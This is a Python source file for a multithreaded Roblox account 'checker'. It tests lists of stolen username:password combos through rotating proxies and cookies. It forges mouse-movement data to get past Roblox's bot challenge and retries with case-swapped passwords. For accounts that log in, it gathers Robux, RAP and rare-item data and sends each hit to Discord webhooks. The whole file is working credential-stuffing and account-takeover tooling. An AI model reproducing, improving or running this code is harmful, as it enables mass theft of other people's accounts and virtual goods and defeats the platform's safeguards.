import base64
import time
import curl_cffi.requests
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import os
import colorama
from colorama import Fore, Style
from typing import Optional, Dict, Any
import ctypes
import threading
from queue import Queue
from collections import deque
import string
from datetime import datetime
import shutil

from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

software_names = [SoftwareName.CHROME.value]
operating_systems = [OperatingSystem.WINDOWS.value]   

user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=1000)

rareItems = [
    48894692,
    14463095,
    16469427,
    42070576,
    181651981,
    6340133,
    11453609,
    10907532,
    10907531,
    14405720,
    10907534,
    8330578,
    10907546,
    11123805,
    181434601,
    189963816,
    6340269,
    8330576,
    6340141,
    6340208,
    6340192,
    2845812591,
    1158038,
    124746102,
    1029668,
    1163672,
    100981923,
    100302996,
    305888394,
    10831438
]

class BufferedFileWriter:
    def __init__(self, file_path, buffer_size=5000):
        self.file_path = file_path
        self.buffer_size = buffer_size
        self.buffer = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        # self.write_thread = threading.Thread(target=self._write_loop)
        # self.write_thread.start()

    def add_line(self, line):
        with self.lock:
            self.buffer.append(line)
            if len(self.buffer) >= self.buffer_size * 2:
                self._flush()

    def _flush(self):
        if self.buffer:
            with open(self.file_path, "a", encoding="utf-8") as f:
                f.writelines(line + "\n" for line in self.buffer)
            self.buffer.clear()

    def _write_loop(self):
        while not self.stop_event.is_set():
            time.sleep(1)
            with self.lock:
                self._flush()

    def close(self):
        self.stop_event.set()
        # self.write_thread.join()
        with self.lock:
            self._flush()


class checked:
    _content = ""
    @classmethod
    def read(cls):
        cls._content = open("checked.txt", "r").read()

    @classmethod
    def contains(cls, str):
        return str in cls._content

# bufferedWriter = BufferedFileWriter("checked.txt", buffer_size=500)

def remove_lines_inplace(file_path, condition_func):
    temp_file = file_path + '.tmp'
    with open(file_path, 'r') as infile, open(temp_file, 'w') as outfile:
        for line in infile:
            if not condition_func(line):
                outfile.write(line)
    shutil.move(temp_file, file_path)

with open('config.json') as f:
    config = json.load(f)
    __proxies__ = config['proxies']
    __output__ = config['output']
    __threads__ = int(config['threads'])
    __webhook__ = config['webhook']
    __rapwebhook__ = config['rap_webhook']
    __id__ = config['discordid']
    __rarewebhook__ = config['rare_webhook']

colorama.init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')

def swapcase_first_letter(s):
    for i, char in enumerate(s):
        if char.isalpha():
            return s[:i] + char.swapcase() + s[i+1:]
    return s

class Stats:
    def __init__(self):
        self.checked_count = 0
        self.start_time = None
        self.total_combos = 0
        self.lock = threading.Lock()
        
    def increment(self):
        with self.lock:
            self.checked_count += 1

stats = Stats()

class proxm:
    def __init__(self, proxy_file):
        with open(proxy_file, encoding="utf-8") as f:
            self.proxies = deque(line.strip() for line in f if line.strip())
        self.lock = threading.Lock()
        
    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                with open(__proxies__, encoding="utf-8") as f:
                    self.proxies.extend(line.strip() for line in f if line.strip())
            proxy = self.proxies.popleft()
            self.proxies.append(proxy)
            return proxy
            
    @staticmethod
    def format_proxy(proxy: str) -> str:
        parts = proxy.split(':')
        if '@' in proxy or len(parts) == 2:
            return proxy
        if '.' in parts[0]:
            return f'{":".join(parts[2:])}@{":".join(parts[:2])}'
        return f'{":".join(parts[:2])}@{":".join(parts[2:])}'

prox = proxm(__proxies__)

class ckz:
    def __init__(self, cookie_file: str = 'cookies.txt'):
        self.cookie_file = cookie_file
        self.cookies = self._load_cookies()
        self.lock = threading.Lock()
        
    def _load_cookies(self) -> list:
        try:
            with open(self.cookie_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}Error: {self.cookie_file} not found{Style.RESET_ALL}")
            return []
            
    def get_random_cookie(self) -> str:
        with self.lock:
            if not self.cookies:
                self.cookies = self._load_cookies()
            if not self.cookies:
                return ""
            return random.choice(self.cookies)

cookieckz = ckz()

class Logger:
    def __init__(self):
        self.queue = Queue()
        self.LOG_FORMAT = "{Fore.LIGHTBLACK_EX}[{timestamp}]{Style.RESET_ALL} ({symbol}) {color}{type_msg}{Style.RESET_ALL} | {username}"
        self._start_worker()
        
    def _start_worker(self):
        def worker():
            while True:
                msg = self.queue.get()
                if msg is None:
                    break
                print(msg)
                self.queue.task_done()
        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        
    def log(self, symbol: str, color: str, type_msg: str, username: str) -> None:
        msg = self.LOG_FORMAT.format(
            Fore=Fore,
            Style=Style,
            timestamp=time.strftime('%H:%M:%S'),
            symbol=symbol,
            color=color,
            type_msg=type_msg,
            username=username
        )
        self.queue.put(msg)
    
    def rostile(self, username: str): self.log("*", Fore.MAGENTA, "Rostile detected", username)
    def invalid(self, username: str): self.log("X", Fore.RED, "Invalid account", username)
    def checking(self, username: str): self.log("^", Fore.CYAN, "Ratelimited", username)
    def captcha(self, username: str): self.log("*", Fore.YELLOW, "Failed to solve", username)
    def solved(self, username: str): self.log("+++", Fore.GREEN, "Solved captcha", username)
    def success(self, username: str): self.log("+++", Fore.GREEN, "Valid account", username)
    def locked(self, username: str): self.log("---", Fore.YELLOW, "Account locked", username)
    def banned(self, username: str): self.log("---", Fore.YELLOW, "Account banned", username)
    def twofa(self, username: str): self.log("---", Fore.YELLOW, "2FA", username)
    def multi(self, username: str): self.log("+++", Fore.GREEN, "FROM-MAIL", username)
    def checked(self, username: str): self.log("//", Fore.YELLOW, "Already Checked", username)

logger = Logger()

class file:
    def __init__(self):
        self.lock = threading.Lock()
        
    def write(self, filename: str, content: str):
        with self.lock:
            with open(filename, 'a') as f:
                f.write(f'{content}\n')

filea = file()

class checked:
    _content = ""

    @classmethod
    def loadfile(cls, file):
        with open(file, "r") as f:
            cls._content = f.read()

    @classmethod
    def checked(cls, str):
        return str in cls._content

    @classmethod
    def append(cls, str):
        cls._content += str

def update_title():
    while True:
        if stats.start_time:
            elapsed_time = (datetime.now() - stats.start_time).total_seconds()
            if elapsed_time > 0:
                cpm = int((stats.checked_count / elapsed_time) * 60)
            else:
                cpm = 0
            ctypes.windll.kernel32.SetConsoleTitleW(f'CPM: {cpm} | {stats.checked_count}/{stats.total_combos}')
        time.sleep(1)

class usr:
    def __init__(self, user_file: str = 'users.txt'):
        self.user_file = user_file
        self.users = self._load_users()
        self.lock = threading.Lock()
        
    def _load_users(self) -> deque:
        try:
            with open(self.user_file, 'r') as f:
                return deque(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(f"{Fore.RED}Error: {self.user_file} not found{Style.RESET_ALL}")
            return deque()
            
    def get_random_user(self) -> str:
        with self.lock:
            if not self.users:
                self.users = self._load_users()
            if not self.users:
                return ""
            user = self.users.popleft()
            self.users.append(user)
            return user
        
    def get_random_ua(self) -> str:
        agents = [
            ("chrome", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6265.210 Safari/537.36"),
            # ("chrome133a", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36")
        ]

        impersonate, agent = random.choice(agents)
        return impersonate, agent

usrr = usr()

class RobloxChecker:
    impersonate, agent = usrr.get_random_ua()

    HEADERS = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.roblox.com',
        'referer': 'https://www.roblox.com/',
        'user-agent': user_agent_rotator.get_random_user_agent()
    }
    
    def __init__(self):
        self.session = self._create_session()
        self.headers = self.HEADERS.copy()
    
    def _create_session(self) -> curl_cffi.requests.Session:
        try:
            
            session = curl_cffi.requests.Session(impersonate=self.impersonate)
            cookie = cookieckz.get_random_cookie()
            if cookie:
                session.cookies[".ROBLOSECURITY"] = cookie
            return session
        except Exception:
            return curl_cffi.requests.Session()

    def _make_request(self, method: str, url: str, **kwargs) -> Optional[curl_cffi.requests.Response]:
        for _ in range(10): 
            try:
                return getattr(self.session, method)(url, **kwargs)
            except Exception as e:
                # print(e)
                continue
        return None

    def initialize_session(self) -> bool:
        try:
            proxy = prox.get_proxy()
            formatted_proxy = prox.format_proxy(proxy)
            proxy_dict = {
                'http': f'http://{formatted_proxy}',
                'https': f'http://{formatted_proxy}'
            }
            self.session.proxies = proxy_dict
            response = self._make_request('get', 'https://www.roblox.com/login', timeout=7)
            if not response or response.status_code == 429:
                return False
            nonce_response = self._make_request('get', 'https://apis.roblox.com/hba-service/v1/getServerNonce', timeout=7)
            if not nonce_response:
                return False
            self.server_nonce = nonce_response.text.strip('"')
            return True
        except Exception:
            return False

    def get_rap(self, user_id: int) -> tuple[int, bool, bool, bool]:
        try:
            RAP = 0
            has_fedora = False
            has_egg = False
            cursor = ""
            base_url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100"
                
            while cursor is not None:
                url = f"{base_url}&cursor={cursor}" if cursor else base_url
                response = self._make_request('get', url, timeout=7)
                if not response or response.status_code != 200:
                    return RAP, has_fedora, has_egg
                        
                data = response.json()
                items = data.get("data", [])
                    
                for item in items:
                    RAP += item.get("recentAveragePrice", 0)
                    if item.get("assetId") == 19027209:
                        has_fedora = True
                    if item.get("assetId") == 76692407:
                        has_egg = True
                            
                cursor = data.get("nextPageCursor")
                    
            return RAP, has_fedora, has_egg
        except Exception:
            return 0, False, False, False
        
    def get_items(self, user_id: int):
        def make_str(l):
            if l:
                s = ", ".join(l)
                max_length = 1024
                return s[:max_length - 3] + "..." if len(s) > max_length else s
            else:
                return "None"
            
        items = {
            "rare_items": [],
            "hats": [],
            "faces": [],
            "heads": []
        }

        urls = {
            "hats": f"https://inventory.roblox.com/v2/users/{user_id}/inventory/8?cursor=&limit=100&sortOrder=Desc",
            "faces": f"https://inventory.roblox.com/v2/users/{user_id}/inventory/18?cursor=&limit=100&sortOrder=Desc",
            "heads": f"https://inventory.roblox.com/v2/users/{user_id}/inventory/17?cursor=&limit=100&sortOrder=Desc"
        }

        max_retries = 3
        retry_delay = 2

        for key, url in urls.items():
            for attempt in range(max_retries):
                try:
                    response = self._make_request('get', url, timeout=7)
                    if not response:
                        raise
                    if response.status_code == 200:
                        data = response.json().get("data", [])
                        for item in data:
                            asset_id = item.get("assetId")
                            asset_name = item.get("assetName")

                            items[key].append(asset_name)
                            if asset_id in rareItems:
                                items["rare_items"].append(asset_name)
                        break
                    else:
                        print(f"Failed to retrieve {key}, status code: {response.status_code}")
                except Exception as e:
                    print(f"Error retrieving {key} (attempt {attempt + 1}/{max_retries}): {e}")
                
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)

        return {
            "rare_items": make_str(items["rare_items"]),
            "hats": make_str(items["hats"]),
            "faces": make_str(items["faces"]),
            "heads": make_str(items["heads"]),
            "is_verified": "Sign" if "Verified Sign" in items["hats"] else "Hat" if "Verified, Bonafide, Plaidafied" in items["hats"] else False,
            "total_items": len(items["hats"])
        }
    
    def get_creation_date(self, user_id) -> str:
        try:
            response = self._make_request('get', f"https://users.roblox.com/v1/users/{user_id}")
            if not response:
                return "idk"
            user_data = response.json()
            creation_date = user_data.get("created", None)
            return datetime.fromisoformat(creation_date).year if creation_date else "_unknown"
        except Exception as e:
            print(e)
            return "idk"
        
    def get_robux(self, user_id: int) -> int:
        try:
            response = self._make_request('get', f"https://economy.roblox.com/v1/users/{user_id}/currency", timeout=7)
            if not response:
                return 0
            return response.json().get("robux", 0)
        except Exception as e:
            print(e)
            return 0

    def _handle_successful_login(self, response_data: Dict[str, Any], username: str, password: str, cookie) -> bool:
        # bufferedWriter.add_line(f"{username}:{password}")
        user_id = response_data['user']['id']
        display_name = response_data['user']['name']

        logger.success(username)
        
        if response_data.get('isBanned'):
            logger.banned(username)
            filea.write('banned.txt', f'{display_name}:{password}')
            if "@" in username:
                threading.Thread(target=RobloxChecker().handle_login,args=(username,swapcase_first_letter(password)))
            return True
        
        robux = self.get_robux(user_id)
        rap, has_fedora, has_egg = self.get_rap(user_id)
        items = self.get_items(user_id)
        creation_date = self.get_creation_date(user_id)
        
        hit_format = f"{display_name}:{password}:{user_id}:{robux}:{rap}:{username}"
        filea.write(__output__, hit_format)

        if robux > 0:
            os.makedirs('results/robux', exist_ok=True)
            with open(f'results/robux/robux{robux}.txt', 'a') as f:
                f.write(f"{hit_format}\n")

        if rap > 0:
            os.makedirs('results/rap', exist_ok=True)
            with open(f'results/rap/rap{rap}.txt', 'a') as f:
                f.write(f"{hit_format}\n")

        requests.post(__rarewebhook__ if items["rare_items"] != "None" else __rapwebhook__ if rap > 0 else __webhook__, json={
            "content": f"<@{__id__}>",
            "embeds": [{
                "title": "Hit",
                "color": 0x000000,
                "fields": [
                    {"name": "Username", "value": display_name, "inline": True},
                    {"name": "User ID", "value": str(user_id), "inline": True},
                    {"name": "Robux", "value": str(robux), "inline": True},
                    {"name": "RAP", "value": str(rap), "inline": True},
                    {"name": "Hats", "value": str(items["hats"]), "inline": True},
                    {"name": "Faces", "value": str(items["faces"]), "inline": True},
                    {"name": "Heads", "value": str(items["heads"]), "inline": True},
                    {"name": "Rare Items", "value": str(items["rare_items"]), "inline": True},
                    {"name": "Total Hats", "value": str(items["total_items"]), "inline": True},
                    {"name": "Creation Date", "value": str(creation_date), "inline": True}
                ]
            }]
        }, timeout=7)
        
        return True
    
    def get_solution(self, challenge_id) -> dict:
        start_timestamp = random.uniform(7000, 20000)
        amount_of_movements = random.randint(10, 100)

        click_x, click_y = random.randint(778, 1136), random.randint(499, 544)

        current_x, current_y = random.randint(500, 800), random.randint(200, 500)
        current_timestamp = start_timestamp

        mouse_movements = []

        for _ in range(amount_of_movements):
            increase_x, increase_y = random.choice([True, False]), random.choice([True, False])

            if current_x + 15 < 1910:
                increase_x = False
            if current_x - 15 < 2:
                increase_x = True
            
            if current_y + 15 < 1910:
                increase_y = False
            if current_y - 15 < 2:
                increase_y = True

            if increase_x:
                current_x += random.randint(1, 3) if random.random() <= 0.7 else random.randint(4, 15)
            else:
                current_x -= random.randint(1, 3) if random.random() <= 0.7 else random.randint(4, 15)

            if increase_y:
                current_y += random.randint(1, 3) if random.random() <= 0.7 else random.randint(4, 15)
            else:
                current_y -= random.randint(1, 3) if random.random() <= 0.7 else random.randint(4, 15)

            mouse_movements.append({"x": current_x, "y": current_y, "timestamp": current_timestamp})

            current_timestamp += random.uniform(10, 60)

        solution = {
            "challengeId": challenge_id,
            "solution": {
                "buttonClicked": True,
                "click": {
                    "x": click_x,
                    "y": click_y,
                    "timestamp": mouse_movements[-1]["timestamp"] - random.uniform(50, 200),
                    "duration": random.uniform(50, 400)
                },
                "completionTime": random.uniform(3000, 15000),
                "mouseMovements": mouse_movements,
                "screenSize": {
                    "width": 1920,
                    "height": 1080
                },
                "buttonLocation": {
                    "x": 776,
                    "y": 496.6875,
                    "width": 360,
                    "height": 48
                },
                "windowSize": {
                    "width": 1912,
                    "height": 954
                },
                "isMobile": False
            }
        }

        return solution

    def _handle_login_response(self, response: curl_cffi.requests.Response, username: str, password: str) -> Optional[bool]:
        try:
            # filea.write("checked.txt", f"{username}:{password}")

            response_data = json.loads(response.text)
            if 'Account has been locked' in response.text:
                logger.locked(username)
                filea.write('locked.txt', f'{username}:{password}')
                if "@" in username:
                    threading.Thread(target=RobloxChecker().handle_login,args=(username,swapcase_first_letter(password)))
                return False
            if "Security Question" in response.text or "twoStepVerificationData" in response.text:
                logger.twofa(username)
                filea.write('2fa.txt', f'{username}:{password}')
                if "@" in username:
                    threading.Thread(target=RobloxChecker().handle_login,args=(username,swapcase_first_letter(password)))
                return False
            if '"code":20' in response.text:
                resp = json.loads(response.text)
                for error in resp.get('errors', []):
                    if error.get('code') == 20:
                        field_data = json.loads(error.get('fieldData', '{}'))
                        users = field_data.get('users', [])
                        for user in users:
                            email = username
                            username = user.get('name')
                            if username:
                                logger.multi(username)
                                threading.Thread(target=RobloxChecker().handle_login,args=(username,password,)).start()
                                threading.Thread(target=RobloxChecker().handle_login,args=(email,swapcase_first_letter(password)))
                                filea.write('mail.txt', f'{username}:{password}')
                return False
            if "Challenge failed to authorize request" in response.text:
                self.session = self._create_session()
                self.headers = self.HEADERS.copy()
                return None
            if 'user' in response_data and 'id' in response_data['user']:
                    return self._handle_successful_login(response_data, username, password, response.cookies['.ROBLOSECURITY'])
            logger.invalid(username)
            filea.write('invalid.txt', f"{username}:{password}")
            
            return False
        except Exception as e:
            print(e)
            return None

    def _handle_rostile(self, response: curl_cffi.requests.Response, username: str, login_data: Dict[str, Any]) -> Optional[bool]:
        try:
            metadata = json.loads(base64.b64decode(response.headers['rblx-challenge-metadata']))
            if "ROSTILE_PUZZLE_TYPE" not in str(metadata):
                logger.captcha(username)
                self.session = self._create_session()
                self.headers = self.HEADERS.copy()
                return None
            # logger.rostile(username)
            challenge_id = metadata['challengeId']
            verify_response = self._make_request(
                'post',
                "https://apis.roblox.com/rostile/v1/verify",
                headers=self.headers,
                json=self.get_solution(challenge_id),
                timeout=7
            )
            if not verify_response:
                return None
                
            redemption_token = verify_response.json()['redemptionToken']
            continue_response = self._make_request(
                'post',
                "https://apis.roblox.com/challenge/v1/continue",
                headers=self.headers,
                json={
                    "challengeId": challenge_id,
                    "challengeType": "rostile",
                    "challengeMetadata": json.dumps({"redemptionToken": redemption_token})
                },
                timeout=7
            )
            if not continue_response:
                return None
                
            self.headers.update({
                "rblx-challenge-id": challenge_id,
                "rblx-challenge-type": "rostile",
                "rblx-challenge-metadata": response.headers['rblx-challenge-metadata']
            })
            # logger.solved(username)
            return True
        except Exception as e:
            print(e)
            return None

    def handle_login(self, username: str, password: str) -> bool:
        max_retries = 3
        if not checked.checked(f"{username}:{password}"):
            for _ in range(max_retries):
                while True:
                    if not self.initialize_session():
                        break
                    
                    try:
                        bypass_username = usrr.get_random_user()
                        if not bypass_username:
                            return False
                            
                        # logger.checking(f"bypassing {username} with {bypass_username}")
                        initial_login_data = {
                            "ctype": "Username",
                            "cvalue": bypass_username,
                            "password": ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(10)),
                            "secureAuthenticationIntent": {
                                "clientPublicKey": "",
                                "clientEpochTimestamp": int(time.time()),
                                "serverNonce": self.server_nonce,
                                "saiSignature": ""
                            }
                        }

                        response = self._make_request('post', 'https://auth.roblox.com/v2/login', json=initial_login_data, timeout=7)
                        if not response:
                            break
                        
                        if response.status_code == 429:
                            self.session = self._create_session()
                            self.headers = self.HEADERS.copy()
                            logger.checking(f"429")
                            continue
                        
                        if "X-Csrf-Token" in response.headers:
                            self.headers['x-csrf-token'] = response.headers['X-Csrf-Token']
                            response = self._make_request('post', 'https://auth.roblox.com/v2/login', headers=self.headers, json=initial_login_data, timeout=7)
                            if not response:
                                break
                                
                            if response.status_code == 429:
                                self.session = self._create_session()
                                self.headers = self.HEADERS.copy()
                                logger.checking(f"429")
                                continue
                        
                        try:
                            if 'rblx-challenge-metadata' in response.headers:
                                rostile_result = self._handle_rostile(response, username, initial_login_data)
                                if rostile_result:
                                    # logger.checking(username)
                                    login_data = {
                                        "ctype": f"{'Email' if '@' in username else 'Username'}",
                                        "cvalue": username,
                                        "password": password,
                                        "secureAuthenticationIntent": {
                                            "clientPublicKey": "",
                                            "clientEpochTimestamp": int(time.time()),
                                            "serverNonce": self.server_nonce,
                                            "saiSignature": ""
                                        }
                                    }
                                    
                                    response = self._make_request('post', 'https://auth.roblox.com/v2/login', headers=self.headers, json=login_data, timeout=7)
                                    if not response:
                                        break
                                        
                                    result = self._handle_login_response(response, username, password)
                                    if result is not None:
                                        return result
                        except Exception as e:
                            print(e)
                            break
                        
                        break
                        
                    except Exception as e:
                        print(e)
                        break
        else:
            logger.checked(username)
                    
        return False

checked_accounts = set()
checked_accounts_lock = threading.Lock()

def worker(combo: str):
    if not combo or ':' not in combo:
        return
        
    parts = combo.strip().split(':', 1)
    if len(parts) != 2:
        return
        
    username, password = parts
    if not username:
        return
        
    with checked_accounts_lock:
        if username in checked_accounts:
            return
        checked_accounts.add(username)
        
    checker = RobloxChecker()
    checker.handle_login(username, password)
    stats.increment()

def main():
    try: open('checked.txt', 'x', encoding='utf-8').close()
    except: pass

    # checked.loadfile('checked.txt')

    with open('combos.txt', 'r', encoding='utf-8') as f:
        combos = [line.strip() for line in f if ':' in line and line.strip()]
    random.shuffle(combos)
    stats.total_combos = len(combos)
    stats.start_time = datetime.now()
    
    title_thread = threading.Thread(target=update_title, daemon=True)
    title_thread.start()
    
    with ThreadPoolExecutor(max_workers=__threads__) as executor:
        futures = [executor.submit(worker, combo) for combo in combos]
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                continue

if __name__ == "__main__":
    main()

# bufferedWriter._flush()
# bufferedWriter.close()